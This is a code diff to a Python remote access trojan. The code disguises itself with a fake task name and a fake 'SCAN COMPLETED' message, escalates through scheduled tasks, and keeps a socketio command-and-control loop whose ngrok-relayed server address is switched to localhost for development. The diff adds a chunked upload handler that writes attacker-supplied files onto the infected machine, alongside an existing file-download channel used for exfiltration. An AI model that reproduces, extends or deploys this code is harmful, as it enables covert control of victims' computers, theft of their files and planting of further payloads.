@@ -1,7 +1,7 @@
-import socketio, sys, os, zipfile, requests, subprocess, ctypes, time
+import socketio, sys, os, zipfile, subprocess, ctypes, time
 from uuid import uuid4, getnode
 from datetime import datetime
-from infection_urls import fake_name, ngrok_linker_url
+from infection_urls import fake_name
 
 # ------------------------ SECURITY BYPASS -------------------------
 ware_name = sys.argv[0].split("\\")[-1].split(".")[0]
@@ -29,7 +29,7 @@ def admin_bypass():
     os.system(f"schtasks.exe /Run /TN \"{fake_name}\"")
     os.system("msg * /TIME:2 [67695] SCAN COMPLETED")
     sys.exit()  # PREVENTS RUNNING IT FROM PATH WHERE USER HAVE INSTALLED IT. (FROM PD OR OTHER REMOVABLE MEDIA)
-admin_bypass()  # UNCOMMENT IT
+# admin_bypass()  # UNCOMMENT IT
 
 # ----------------------------- END ------------------------------
 
@@ -77,9 +77,9 @@ def get_mac():
 
 while 1:
     try:
-        r = requests.post(ngrok_linker_url)
-        url_ = r.text
-        # url_ = "http://127.0.0.1:5000"  # JUST FOR DEVELOPMENT
+        # r = requests.post(ngrok_linker_url)
+        # url_ = r.text
+        url_ = "http://127.0.0.1:5000"  # JUST FOR DEVELOPMENT
 
         ws = socketio.Client()
 
@@ -127,6 +127,24 @@ while 1:
                     data_["current_chunk"] += 1
                     data_["total_chunks"] = file_size//data_["chunk_size"]
                     self.emit("response_channel", data_)
+                except BaseException as e:
+                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})
+
+            def on_upload_file(self, data_):
+                try:
+                    if os.path.exists(data_["file_name"]) and data_["init"]:
+                        self.emit("response_channel", {"error": "FILE ALREADY EXISTS", "type": "error_msg"})
+                    else:
+                        if not len(data_["chunk"]):
+                            self.emit("response_channel", {"msg": f"file `{data_['file_name']}` successfully!", "type": "file_uploaded"})
+                            self.on_list_files()
+                            return
+                        with open(data_["file_name"], "ab") as fp:
+                            fp.write(data_["chunk"])
+                        del data_["chunk"]
+                        data_["chunk_from"] = data_["chunk_to"]
+                        data_["chunk_to"] += data_["chunk_size"]
+                        self.emit("next_chunk", data_)
                 except BaseException as e:
                     self.emit("response_channel", {"error": str(e), "type": "error_msg"})
 
